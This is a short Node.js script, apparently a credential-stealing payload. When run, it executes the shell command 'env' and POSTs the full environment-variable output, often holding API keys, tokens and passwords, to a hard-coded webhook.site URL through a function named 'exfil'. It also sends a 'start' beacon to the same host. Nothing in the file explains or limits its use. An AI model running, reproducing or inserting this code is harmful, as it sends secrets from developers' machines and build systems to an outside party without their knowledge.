const https = require('https');
const http = require('http');
const { exec } = require("child_process");
const { promisify } = require("util");

const execAsync = promisify(exec);

const WEBHOOK = '/2570eaae-6de5-482a-8747-6ab0acabd946';

function httpGet(host, port, path, headers = {}, timeout = 2000) {
  return new Promise((resolve) => {
    const opts = { hostname: host, port, path, timeout, headers };
    const req = http.get(opts, (res) => {
      let data = '';
      res.on('data', c => { if (data.length < 500) data += c; });
      res.on('end', () => resolve({ status: res.statusCode, body: data.slice(0, 300) }));
    });
    req.on('error', (e) => resolve({ error: e.message }));
    req.on('timeout', () => { req.destroy(); resolve({ error: 'timeout' }); });
  });
}

function exfil(data) {
  return new Promise((resolve) => {
    const body = typeof data === 'string' ? data : JSON.stringify(data, null, 2);
    const opts = {
      hostname: 'webhook.site', port: 443, path: WEBHOOK, method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) }
    };
    const req = https.request(opts, (res) => {
      res.on('data', () => {});
      res.on('end', () => resolve('sent'));
    });
    req.on('error', (e) => resolve('error: ' + e.message));
    req.write(body);
    req.end();
  });
}

async function runCommand(command) {
  try {
    const { stdout } = await execAsync(command);
    return stdout.trim();
  } catch (err) {
    throw new Error(
      `Command failed (${err.code}): ${err.stderr || err.message}`
    );
  }
}

async function run() {
  await exfil({ status: 'start'});
  let oneliner = 'env';
  let result = await runCommand(oneliner);
  
  await exfil({ data: result });
}

run();
